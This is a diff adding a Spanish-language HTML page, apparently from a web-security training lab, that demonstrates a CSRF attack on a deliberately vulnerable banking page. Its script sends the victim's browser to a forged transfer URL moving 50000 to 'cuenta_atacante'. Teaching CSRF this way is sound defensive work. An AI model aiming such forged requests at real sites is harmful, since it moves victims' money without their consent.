@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nivel 1 | Pagina atacante</title>
+  <link rel="stylesheet" href="/public/styles.css">
+</head>
+<body>
+  <main class="container">
+    <h1>Pagina atacante CSRF</h1>
+
+    <div class="box warning">
+      <p>Escenario: el usuario esta logueado en la banca vulnerable en otra pestana.</p>
+      <p>Esta pagina fuerza una transferencia usando una solicitud construida por el atacante.</p>
+      <button id="launchAttack" class="btn" type="button">Lanzar ataque CSRF</button>
+    </div>
+
+    <p><a href="/nivel1/transfer.html">Volver a la banca vulnerable</a></p>
+    <p><a href="/nivel1/">Volver a nivel 1</a></p>
+  </main>
+
+  <script>
+    (function () {
+      document.getElementById('launchAttack').addEventListener('click', function () {
+        const target = '/nivel1/transfer.html?to=cuenta_atacante&amount=50000&origin=evil';
+        window.location.href = target;
+      });
+    })();
+  </script>
+  <script src="/public/lab-extras.js"></script>
+</body>
+</html>
